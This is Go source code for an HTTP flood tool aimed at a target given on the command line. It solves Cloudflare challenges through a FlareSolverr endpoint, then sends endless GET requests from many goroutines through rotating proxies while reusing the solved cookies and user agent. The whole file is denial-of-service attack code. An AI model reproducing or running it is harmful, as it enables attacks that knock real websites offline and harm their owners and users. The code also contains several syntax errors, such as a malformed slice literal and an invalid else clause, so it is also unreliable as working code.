package main

import (
	"flare/flaresolver"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var LoadedProxies = make(map[int]string)

var (
	Host           = ""
	MaxThreads     = 100
	Time           = 30
	Proxies        = "proxies.txt"
	Browsers       = 1000
	Threads        = 0
	RunningThreads = 0
	FlareSolvers   = []string
	{
		"http://127.0.0.1:8191/v1"
	}
)

func main() {
	fmt.Println("[info] HTTP Browser (v1)")
	if len(os.Args) < 4 {
		fmt.Println("[info] ./httpbrowser [target] [threads] [time] [proxylist] browsers=[browsers]")
		return
	}

	Arguments := os.Args[1:]
	Host = Arguments[0]
	Arguments = Arguments[1:]
	MaxThreads, _ = strconv.Atoi(Arguments[0])
	Arguments = Arguments[1:]
	Time, _ = strconv.Atoi(Arguments[0])
	Arguments = Arguments[1:]
	Proxies = Arguments[0]
	Arguments = Arguments[1:]

	for _, x := range Arguments {
		if strings.Contains(x, "browsers=") {
			Browsers, _ = strconv.Atoi(strings.Split(x, "=")[1])
		}
	}

	f, err := os.Open(Proxies)
	if err != nil {
		return
	}
	defer f.Close()
	body, err := ioutil.ReadAll(f)
	if err != nil {
		return
	}

	parsed := strings.ReplaceAll(string(body), "\r\n", "\n")
	prox := strings.Split(parsed, "\n")
	for i, p := range prox {
		LoadedProxies[i] = p
	}
	fmt.Println(fmt.Sprintf("[info] Host: %s, Threads per browser: %d, Time: %d, Proxies: %d, Browsers: %d", Host, MaxThreads, Time, len(LoadedProxies), Browsers))
	fmt.Println(fmt.Sprintf("[info] Bypassing firewalls..."))
	go func getdata() {
		for i := 0; i < Browsers; i++ {
			proxy := LoadedProxies[rand.Intn(len(LoadedProxies))]
			go func() {
				solver := flaresolver.SolveProxy(Host, FlareSolvers[rand.Intn(len(FlareSolvers))], proxy)
				if solver.Status == "ok" || solver.Status == "success" {
					fmt.Println(fmt.Sprintf("[success] Bypassed firewall!"))
					for i := 0; i < MaxThreads; i++ {
						go createFlooder(*solver, proxy)
					}
				} else solver.Status == "error" {
					go getdata()
				}
			}()
		}
	}()
	time.Sleep(time.Duration(Time) * time.Second)
}

func createFlooder(response flaresolver.Response, proxy string) {
	for {
		proxyUrl, err := url.Parse(fmt.Sprintf("http://%s", proxy))
			if err != nil {
				fmt.Println("Error by Parsing Proxy. Check Proxies file.")
				return
			}
			Http2ProxyConfig := &http.Transport{
				Proxy: http.ProxyURL(proxyUrl),
			}
			client := http.Client{
				Timeout:   5000 * time.Millisecond,
				Transport: Http2ProxyConfig,
			}
			req, err := http.NewRequest("GET", response.Solution.Url, nil)
			if err != nil {
				fmt.Println("Can't build Request")
				return
			}
			for _, cookie := range response.Solution.Cookies {
				req.AddCookie(&http.Cookie{
					Name:     cookie.Name,
					Value:    cookie.Value,
					Path:     cookie.Path,
					Domain:   cookie.Domain,
					Expires:  time.Unix(int64(cookie.Expires), 0),
					Secure:   cookie.Secure,
					HttpOnly: cookie.HttpOnly,
				})
			}
			req.Header.Set("User-Agent", response.Solution.UserAgent)
			for {
				res, err := client.Do(req)
				if err != nil {
					return
				}
				fmt.Println(res.StatusCode)
			}
		}
	}
